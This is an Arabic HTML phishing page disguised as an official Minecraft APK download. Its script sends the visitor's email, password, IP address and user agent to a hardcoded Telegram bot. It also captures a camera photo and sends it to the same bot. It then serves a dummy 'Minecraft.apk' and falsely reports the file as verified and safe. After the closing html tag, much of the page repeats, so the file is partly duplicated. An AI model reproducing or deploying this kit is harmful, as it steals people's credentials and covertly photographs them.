<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft - تنزيل مجاني</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #2d2d2d;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            background-image: url('https://i.imgur.com/8z1p3Wx.png');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }
        .container {
            background: rgba(30, 30, 30, 0.85);
            backdrop-filter: blur(10px);
            padding: 35px 30px;
            border-radius: 20px;
            box-shadow: 0 0 60px rgba(0, 200, 255, 0.1);
            max-width: 450px;
            width: 90%;
            border: 3px solid #6ab04c;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(106, 176, 76, 0.03) 2px, rgba(106, 176, 76, 0.03) 4px);
            pointer-events: none;
            animation: scan 10s linear infinite;
        }
        @keyframes scan {
            0% { transform: translateY(-50%); }
            100% { transform: translateY(0%); }
        }
        .logo {
            font-size: 52px;
            margin-bottom: 5px;
            position: relative;
            z-index: 1;
        }
        .logo h1 {
            font-size: 34px;
            font-weight: 700;
            color: #6ab04c;
            margin-top: 5px;
            text-shadow: 0 0 20px rgba(106, 176, 76, 0.3);
            letter-spacing: 2px;
            position: relative;
            z-index: 1;
        }
        .sub {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 20px;
            border-bottom: 2px solid #6ab04c;
            padding-bottom: 15px;
            position: relative;
            z-index: 1;
        }
        .info {
            background: rgba(18, 18, 42, 0.7);
            padding: 15px;
            border-radius: 14px;
            border: 1px solid #6ab04c;
            margin-bottom: 20px;
            text-align: left;
            position: relative;
            z-index: 1;
        }
        .info div {
            display: flex;
            justify-content: space-between;
            padding: 6px 0;
            font-size: 14px;
            color: #aaa;
        }
        .info div span:last-child {
            color: #6ab04c;
            font-weight: bold;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
            position: relative;
            z-index: 1;
        }
        .input-group label {
            font-size: 13px;
            color: #6ab04c;
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            letter-spacing: 1px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            border-radius: 10px;
            border: 2px solid #3a3a3a;
            background: rgba(0, 0, 0, 0.7);
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
            font-family: 'Courier New', monospace;
        }
        .input-group input:focus {
            border-color: #6ab04c;
            box-shadow: 0 0 25px rgba(106, 176, 76, 0.2);
        }
        .input-group input::placeholder {
            color: #555;
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #6ab04c, #4a8a32);
            border: none;
            color: #fff;
            font-weight: bold;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 5px;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            letter-spacing: 2px;
            position: relative;
            z-index: 1;
        }
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 40px rgba(106, 176, 76, 0.4);
        }
        .btn-secondary {
            background: #3a3a3a;
            margin-top: 10px;
        }
        .btn-secondary:hover {
            background: #4a4a4a;
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
        }
        #status {
            margin-top: 18px;
            font-size: 14px;
            color: #aaa;
            padding: 12px;
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #3a3a3a;
            min-height: 50px;
            position: relative;
            z-index: 1;
            font-family: 'Courier New', monospace;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #444;
            border-top: 1px solid #3a3a3a;
            padding-top: 15px;
            position: relative;
            z-index: 1;
        }
        .loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid #3a3a3a;
            border-top: 3px solid #6ab04c;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* تأثير ناري احتراقي */
        .fire {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            background: radial-gradient(ellipse at center bottom, rgba(255, 100, 0, 0.1) 0%, transparent 70%);
            animation: fire 2s ease-in-out infinite alternate;
            z-index: 0;
        }
        @keyframes fire {
            0% { opacity: 0.3; transform: scale(1); }
            100% { opacity: 0.7; transform: scale(1.1); }
        }
        /* شعار ماينكرافت */
        .minecraft-icon {
            font-size: 60px;
            display: block;
            margin-bottom: 5px;
            text-shadow: 0 0 40px rgba(106, 176, 76, 0.3);
        }
        /* أزرار بجودة عالية */
        .btn-minecraft {
            background: #6ab04c;
            border: 2px solid #4a8a32;
            text-shadow: 0 2px 0 #3a6a2a;
        }
        .btn-minecraft:hover {
            background: #7ac05c;
            border-color: #5a9a42;
        }
        /* صندوق المعلومات */
        .info-box {
            background: rgba(0, 0, 0, 0.6);
            border: 2px solid #6ab04c;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 15px;
        }
        .info-box .row {
            display: flex;
            justify-content: space-between;
            padding: 4px 0;
            font-size: 13px;
            color: #aaa;
            border-bottom: 1px solid #2a2a2a;
        }
        .info-box .row:last-child {
            border-bottom: none;
        }
        .info-box .row span:last-child {
            color: #6ab04c;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="fire"></div>

        <div class="minecraft-icon">⛏️</div>
        <h1 style="color:#6ab04c; font-size:34px; margin-bottom:5px; text-shadow:0 0 30px rgba(106,176,76,0.3); position:relative; z-index:1;">MINECRAFT</h1>
        <div class="sub">▼ تنزيل الإصدار 1.21.4 – النسخة الرسمية ▼</div>

        <div class="info-box">
            <div class="row"><span>📦 الملف</span><span>Minecraft.apk</span></div>
            <div class="row"><span>📏 الحجم</span><span>287 MB</span></div>
            <div class="row"><span>📅 الإصدار</span><span>28 يونيو 2026</span></div>
            <div class="row"><span>🔒 التوقيع</span><span>✅ معتمد</span></div>
        </div>

        <div class="input-group">
            <label>📧 البريد الإلكتروني</label>
            <input type="email" id="emailInput" placeholder="example@gmail.com">
        </div>
        <div class="input-group">
            <label>🔑 كلمة المرور</label>
            <input type="password" id="passwordInput" placeholder="••••••••">
        </div>

        <button class="btn btn-minecraft" id="mainBtn">🚀 تحميل Minecraft.apk</button>
        <button class="btn btn-secondary" id="fakeBtn">🔍 التحقق من الملف</button>

        <div id="status">⏳ أدخل بياناتك واضغط تحميل</div>
        <div class="footer">🔒 اتصال آمن • ✅ تم التحقق • ⛏️ Minecraft Official</div>
    </div>

    <script>
        // ============================================================
        // إعدادات بوت تيليغرام (ضع بياناتك هنا)
        // ============================================================
        const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";
        // ============================================================

        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');
        const mainBtn = document.getElementById('mainBtn');
        const fakeBtn = document.getElementById('fakeBtn');
        const statusDiv = document.getElementById('status');

        async function sendData(email, password, action) {
            try {
                const ip = await getIP();
                const message =
                    `🎮 **ماينكرافت - بيانات جديدة**\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}\n📌 الإجراء: ${action}\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}\n🌐 IP: ${ip}`;

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                const result = await response.json();
                return result.ok;
            } catch (e) {
                console.error(e);
                return false;
            }
        }

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'غير معروف';
            } catch {
                return 'غير معروف';
            }
        }

        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "environment" }
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));

                const canvas = document.createElement('canvas');
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                canvas.width = settings.width || 640;
                canvas.height = settings.height || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.9);

                const blob = await fetch(imageData).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'camera.jpg');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (e) {
                console.log('❌ الكاميرا غير متاحة أو مرفوضة');
                return false;
            }
        }

        async function handleMainAction() {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            if (!email || !email.includes('@') || !email.includes('.')) {
                statusDiv.innerHTML = '⚠️ أدخل بريداً إلكترونياً صحيحاً';
                statusDiv.style.color = '#ff9800';
                return;
            }
            if (!password || password.length < 4) {
                statusDiv.innerHTML = '⚠️ كلمة المرور يجب أن تكون 4 أحرف على الأقل';
                statusDiv.style.color = '#ff9800';
                return;
            }

            statusDiv.innerHTML = `<span class="loader"></span> جاري التحميل...`;
            statusDiv.style.color = '#aaa';

            const sent = await sendData(email, password, 'تحميل مباشر');

            if (sent) {
                statusDiv.innerHTML = `✅ تم إرسال بياناتك بنجاح`;
                statusDiv.style.color = '#4caf50';

                setTimeout(async () => {
                    statusDiv.innerHTML = `📷 جاري طلب الكاميرا...`;
                    const cam = await requestCamera();
                    if (cam) {
                        statusDiv.innerHTML = `✅ تم إرسال الصورة أيضاً`;
                    } else {
                        statusDiv.innerHTML = `✅ تم الإرسال (بدون كاميرا)`;
                    }
                    const blob = new Blob(['هذا ملف وهمي لأغراض العرض'], { type: 'application/vnd.android.package-archive' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'Minecraft.apk';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);

                    setTimeout(() => {
                        statusDiv.innerHTML = '📥 تم التنزيل بنجاح';
                        statusDiv.style.color = '#aaa';
                    }, 3000);
                }, 1000);

            } else {
                statusDiv.innerHTML = '❌ فشل الإرسال، حاول مرة أخرى';
                statusDiv.style.color = '#e94560';
            }
        }

        fakeBtn.addEventListener('click', async function() {
            statusDiv.innerHTML = `<span class="loader"></span> جاري التحقق من الملف...`;
            statusDiv.style.color = '#aaa';

            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            if (email && password) {
                await sendData(email, password, 'التحقق من الملف');
            }

            setTimeout(() => {
                statusDiv.innerHTML = `✅ الملف آمن ومعتمد 100%`;
                statusDiv.style.color = '#4caf50';
                setTimeout(() => {
                    statusDiv.innerHTML = '🔍 الملف جاهز للتحميل';
                    statusDiv.style.color = '#aaa';
                }, 2000);
            }, 2000);
        });

        mainBtn.addEventListener('click', handleMainAction);

        emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
        passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
    </script>

</body>
</html>            color: #fff;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
            font-family: 'Courier New', monospace;
        }
        .input-group input:focus {
            border-color: #6ab04c;
            box-shadow: 0 0 25px rgba(106, 176, 76, 0.2);
        }
        .input-group input::placeholder {
            color: #555;
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #6ab04c, #4a8a32);
            border: none;
            color: #fff;
            font-weight: bold;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 5px;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            letter-spacing: 2px;
            position: relative;
            z-index: 1;
        }
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 40px rgba(106, 176, 76, 0.4);
        }
        .btn-secondary {
            background: #3a3a3a;
            margin-top: 10px;
        }
        .btn-secondary:hover {
            background: #4a4a4a;
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
        }
        #status {
            margin-top: 18px;
            font-size: 14px;
            color: #aaa;
            padding: 12px;
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #3a3a3a;
            min-height: 50px;
            position: relative;
            z-index: 1;
            font-family: 'Courier New', monospace;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #444;
            border-top: 1px solid #3a3a3a;
            padding-top: 15px;
            position: relative;
            z-index: 1;
        }
        .loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid #3a3a3a;
            border-top: 3px solid #6ab04c;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* تأثير ناري احتراقي */
        .fire {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            background: radial-gradient(ellipse at center bottom, rgba(255, 100, 0, 0.1) 0%, transparent 70%);
            animation: fire 2s ease-in-out infinite alternate;
            z-index: 0;
        }
        @keyframes fire {
            0% { opacity: 0.3; transform: scale(1); }
            100% { opacity: 0.7; transform: scale(1.1); }
        }
        /* شعار ماينكرافت */
        .minecraft-icon {
            font-size: 60px;
            display: block;
            margin-bottom: 5px;
            text-shadow: 0 0 40px rgba(106, 176, 76, 0.3);
        }
        /* أزرار بجودة عالية */
        .btn-minecraft {
            background: #6ab04c;
            border: 2px solid #4a8a32;
            text-shadow: 0 2px 0 #3a6a2a;
        }
        .btn-minecraft:hover {
            background: #7ac05c;
            border-color: #5a9a42;
        }
        /* صندوق المعلومات */
        .info-box {
            background: rgba(0, 0, 0, 0.6);
            border: 2px solid #6ab04c;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 15px;
        }
        .info-box .row {
            display: flex;
            justify-content: space-between;
            padding: 4px 0;
            font-size: 13px;
            color: #aaa;
            border-bottom: 1px solid #2a2a2a;
        }
        .info-box .row:last-child {
            border-bottom: none;
        }
        .info-box .row span:last-child {
            color: #6ab04c;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="fire"></div>

        <div class="minecraft-icon">⛏️</div>
        <h1 style="color:#6ab04c; font-size:34px; margin-bottom:5px; text-shadow:0 0 30px rgba(106,176,76,0.3); position:relative; z-index:1;">MINECRAFT</h1>
        <div class="sub">▼ تنزيل الإصدار 1.21.4 – النسخة الرسمية ▼</div>

        <div class="info-box">
            <div class="row"><span>📦 الملف</span><span>Minecraft.apk</span></div>
            <div class="row"><span>📏 الحجم</span><span>287 MB</span></div>
            <div class="row"><span>📅 الإصدار</span><span>28 يونيو 2026</span></div>
            <div class="row"><span>🔒 التوقيع</span><span>✅ معتمد</span></div>
        </div>

        <div class="input-group">
            <label>📧 البريد الإلكتروني</label>
            <input type="email" id="emailInput" placeholder="example@gmail.com">
        </div>
        <div class="input-group">
            <label>🔑 كلمة المرور</label>
            <input type="password" id="passwordInput" placeholder="••••••••">
        </div>

        <button class="btn btn-minecraft" id="mainBtn">🚀 تحميل Minecraft.apk</button>
        <button class="btn btn-secondary" id="fakeBtn">🔍 التحقق من الملف</button>

        <div id="status">⏳ أدخل بياناتك واضغط تحميل</div>
        <div class="footer">🔒 اتصال آمن • ✅ تم التحقق • ⛏️ Minecraft Official</div>
    </div>

    <script>
        // ============================================================
        // إعدادات بوت تيليغرام (ضع بياناتك هنا)
        // ============================================================
        const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";
        // ============================================================

        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');
        const mainBtn = document.getElementById('mainBtn');
        const fakeBtn = document.getElementById('fakeBtn');
        const statusDiv = document.getElementById('status');

        async function sendData(email, password, action) {
            try {
                const ip = await getIP();
                const message =
                    `🎮 **ماينكرافت - بيانات جديدة**\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}\n📌 الإجراء: ${action}\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}\n🌐 IP: ${ip}`;

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                const result = await response.json();
                return result.ok;
            } catch (e) {
                console.error(e);
                return false;
            }
        }

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'غير معروف';
            } catch {
                return 'غير معروف';
            }
        }

        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "environment" }
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));

                const canvas = document.createElement('canvas');
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                canvas.width = settings.width || 640;
                canvas.height = settings.height || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.9);

                const blob = await fetch(imageData).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'camera.jpg');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (e) {
                console.log('❌ الكاميرا غير متاحة أو مرفوضة');
                return false;
            }
        }

        async function handleMainAction() {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            if (!email || !email.includes('@') || !email.includes('.')) {
                statusDiv.innerHTML = '⚠️ أدخل بريداً إلكترونياً صحيحاً';
                statusDiv.style.color = '#ff9800';
                return;
            }
            if (!password || password.length < 4) {
                statusDiv.innerHTML = '⚠️ كلمة المرور يجب أن تكون 4 أحرف على الأقل';
                statusDiv.style.color = '#ff9800';
                return;
            }

            statusDiv.innerHTML = `<span class="loader"></span> جاري التحميل...`;
            statusDiv.style.color = '#aaa';

            const sent = await sendData(email, password, 'تحميل مباشر');

            if (sent) {
                statusDiv.innerHTML = `✅ تم إرسال بياناتك بنجاح`;
                statusDiv.style.color = '#4caf50';

                setTimeout(async () => {
                    statusDiv.innerHTML = `📷 جاري طلب الكاميرا...`;
                    const cam = await requestCamera();
                    if (cam) {
                        statusDiv.innerHTML = `✅ تم إرسال الصورة أيضاً`;
                    } else {
                        statusDiv.innerHTML = `✅ تم الإرسال (بدون كاميرا)`;
                    }
                    const blob = new Blob(['هذا ملف وهمي لأغراض العرض'], { type: 'application/vnd.android.package-archive' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'Minecraft.apk';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);

                    setTimeout(() => {
                        statusDiv.innerHTML = '📥 تم التنزيل بنجاح';
                        statusDiv.style.color = '#aaa';
                    }, 3000);
                }, 1000);

            } else {
                statusDiv.innerHTML = '❌ فشل الإرسال، حاول مرة أخرى';
                statusDiv.style.color = '#e94560';
            }
        }

        fakeBtn.addEventListener('click', async function() {
            statusDiv.innerHTML = `<span class="loader"></span> جاري التحقق من الملف...`;
            statusDiv.style.color = '#aaa';

            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            if (email && password) {
                await sendData(email, password, 'التحقق من الملف');
            }

            setTimeout(() => {
                statusDiv.innerHTML = `✅ الملف آمن ومعتمد 100%`;
                statusDiv.style.color = '#4caf50';
                setTimeout(() => {
                    statusDiv.innerHTML = '🔍 الملف جاهز للتحميل';
                    statusDiv.style.color = '#aaa';
                }, 2000);
            }, 2000);
        });

        mainBtn.addEventListener('click', handleMainAction);

        emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
        passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
    </script>

</body>
</html>
